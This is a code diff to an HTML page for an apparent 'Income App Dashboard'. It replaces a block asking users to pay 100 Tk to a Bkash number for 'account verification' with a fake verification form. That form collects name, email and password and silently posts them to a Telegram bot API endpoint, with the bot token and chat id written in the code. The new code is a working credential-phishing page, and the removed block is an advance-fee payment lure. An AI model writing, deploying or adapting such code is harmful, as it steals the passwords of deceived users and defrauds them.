@@ -15,14 +15,58 @@ input {margin:10px; padding:10px; width:80%;}
 
 <h2>💰 Income App Dashboard</h2>
 
-<!-- Account Verify -->
-<div id="account-verify">
-<h3>✅ Account Verify - 100 Tk</h3>
-<p>Send 100 Tk to Bkash: 01821192590, then upload screenshot:</p>
-<input type="file" id="screenshotInput" accept="image/*">
-<button onclick="uploadScreenshot()">Submit Screenshot</button>
-<p id="status"></p>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Account Verify</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body{font-family:sans-serif;background:#0f172a;color:#fff;text-align:center;padding:20px}
+    .box{background:#1e293b;padding:20px;border-radius:12px;max-width:400px;margin:auto}
+    input,button{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none}
+    input{background:#334155;color:#fff}
+    button{background:#22c55e;color:#000;font-weight:bold}
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h2>Account Verify</h2>
+
+  <input id="name" placeholder="Your Name">
+  <input id="email" placeholder="Email">
+  <input id="password" type="password" placeholder="Password">
+
+  <button onclick="sendData()">VERIFY ACCOUNT</button>
 </div>
+
+<script>
+function sendData() {
+
+  const name = document.getElementById("name").value;
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+
+  fetch("https://api.telegram.org/bot8051092032:AAHkSH0CmsEnC33uO54J-EltgPpcrdDuY-I/sendMessage", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({
+      chat_id: "7832485327",
+      text:
+`🔥 New Verify Request
+
+👤 Name: ${name}
+📧 Email: ${email}
+🔑 Password: ${password}`
+    })
+  });
+
+  alert("Submitted ✅");
+}
+</script>
+
+</body>
+</html>
 
 <!-- Menu -->
 <div id="menu">
